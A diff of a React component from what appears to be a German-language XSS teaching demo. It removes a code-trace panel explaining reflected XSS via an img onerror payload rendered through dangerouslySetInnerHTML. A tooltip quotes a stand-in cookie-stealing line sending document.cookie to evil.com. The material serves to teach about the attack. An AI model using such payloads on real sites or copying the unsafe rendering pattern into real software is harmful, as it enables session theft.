@@ -1,7 +1,6 @@
 import { useState, useEffect } from "react"
-import { Arrow, TraceBlock, XSS_PAYLOAD, ReflectedOutput } from "./shared"
+import { XSS_PAYLOAD, DISPLAY_URL, ReflectedOutput } from "./XssCodeTrace"
 
-const DISPLAY_URL = `https://seite.at/suche?q=<img src=x onerror="...">`
 const ATTACK_URL = `https://seite.at/suche?q=${XSS_PAYLOAD}`
 
 // ---------------------------------------------------------------------------
@@ -80,71 +79,3 @@ export function ReflectedXss({ onOutput }: { onOutput: (o: ReflectedOutput) => v
   )
 }
 
-// ---------------------------------------------------------------------------
-// ReflectedCodeTrace
-// ---------------------------------------------------------------------------
-
-export function ReflectedCodeTrace({ output }: { output: ReflectedOutput | null }) {
-  if (!output) {
-    return (
-      <p className="text-xs text-muted-foreground">
-        Klicke auf den Link in der E-Mail, um den Code-Ablauf zu sehen.
-      </p>
-    )
-  }
-
-  return (
-    <div className="flex flex-col gap-3 text-xs">
-      <TraceBlock step="①" label="Manipulierte URL (Angreifer)">
-        {DISPLAY_URL}
-      </TraceBlock>
-
-      <Arrow />
-
-      <TraceBlock step="②" label="Opfer öffnet Link → Seite liest URL-Parameter">
-        {`// React liest den Query-Parameter aus der URL
-const [searchParams] = useSearchParams()
-const q = searchParams.get("q")
-// q = '<img src=x onerror="document.dispatchEvent(...)">'`}
-      </TraceBlock>
-
-      <Arrow />
-
-      {/* ③ mit Tooltip */}
-      <div className="flex flex-col gap-1">
-        <div className="relative group w-fit">
-          <p className="text-xs font-semibold text-muted-foreground cursor-help underline decoration-dotted underline-offset-2">
-            <span className="mr-1">③</span>dangerouslySetInnerHTML rendert Payload als HTML
-          </p>
-          <div className="absolute bottom-full left-0 mb-2 w-80 rounded-md bg-popover border border-border shadow-md px-3 py-2 text-xs text-popover-foreground invisible group-hover:visible z-50 leading-relaxed">
-            <p className="font-semibold mb-1">Warum ist das unsicher?</p>
-            <p><code className="bg-muted px-0.5 rounded">dangerouslySetInnerHTML</code> schreibt einen rohen HTML-String direkt in den DOM — ohne Prüfung oder Escapierung. Der Name ist Absicht: React warnt dich damit explizit.</p>
-            <p className="mt-1">Der URL-Parameter <code className="bg-muted px-0.5 rounded">q</code> wird direkt als HTML gerendert. Was auch immer in der URL steht, landet 1:1 als echter HTML-Code im Browser.</p>
-          </div>
-        </div>
-        <pre className="bg-muted rounded p-2 text-xs overflow-x-auto whitespace-pre-wrap">{`// ⚠️ UNSICHER: Parameter wird direkt als HTML gerendert
-<div dangerouslySetInnerHTML={{ __html: q }} />
-
-// Gerendert im DOM:
-// <div><img src=x onerror="document.dispatchEvent(...)"></div>`}</pre>
-      </div>
-
-      <Arrow />
-
-      {/* ④ mit Tooltip */}
-      <div className="flex flex-col gap-1">
-        <div className="relative group w-fit">
-          <p className="text-xs font-semibold text-muted-foreground cursor-help underline decoration-dotted underline-offset-2">
-            <span className="mr-1">④</span>Browser führt Script aus
-          </p>
-          <div className="absolute bottom-full left-0 mb-2 w-80 rounded-md bg-popover border border-border shadow-md px-3 py-2 text-xs text-popover-foreground invisible group-hover:visible z-50 leading-relaxed">
-            <p className="font-semibold mb-1">Warum löst das Bild den Angriff aus?</p>
-            <p><code className="bg-muted px-0.5 rounded">src="x"</code> existiert nicht — der Ladeversuch schlägt sofort fehl. Genau das ist gewollt: Der <code className="bg-muted px-0.5 rounded">onerror</code>-Handler feuert bei jedem Ladefehler und führt das Schadskript aus.</p>
-            <p className="mt-1">Ein echter Angreifer würde statt <code className="bg-muted px-0.5 rounded">dispatchEvent(...)</code> z.B. <code className="bg-muted px-0.5 rounded">{"fetch('https://evil.com?c='+document.cookie)"}</code> einsetzen.</p>
-          </div>
-        </div>
-        <pre className="bg-muted rounded p-2 text-xs overflow-x-auto whitespace-pre-wrap">{`→ <img> wird in den DOM eingefügt.\n   src="x" schlägt fehl → onerror feuert.\n   CustomEvent "xss-triggered" wird dispatched.\n   React Banner: "⚠ XSS erfolgreich!"`}</pre>
-      </div>
-    </div>
-  )
-}
